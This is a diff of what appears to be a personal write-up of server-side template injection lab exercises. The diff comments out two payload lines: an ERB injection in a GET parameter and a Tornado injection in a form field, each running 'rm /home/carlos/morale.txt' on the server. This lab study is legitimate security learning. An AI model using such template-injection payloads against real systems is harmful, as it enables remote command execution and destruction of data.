@@ -56,7 +56,7 @@ to
 
 Go to: Repeater
 
-GET /?message=<%25%3d+system('rm+/home/carlos/morale.txt')+%25> HTTP/1.1
+#GET /?message=<%25%3d+system('rm+/home/carlos/morale.txt')+%25> HTTP/1.1
 
 Response:
 
@@ -146,7 +146,7 @@ blog-post-author-display=user.name}}{{who+am+i}}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIF
 
 To
 
-blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm+/home/carlos/morale.txt')&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
+#blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm+/home/carlos/morale.txt')&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs
 
 // or // decoded
 
@@ -758,3 +758,4 @@ blog-post-author-display=user.gdprDelete()&csrf=2lBmtB05EzcuAUQDwapveJa0k0t2dTvm
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602030914.png)
 
 #hacking
+
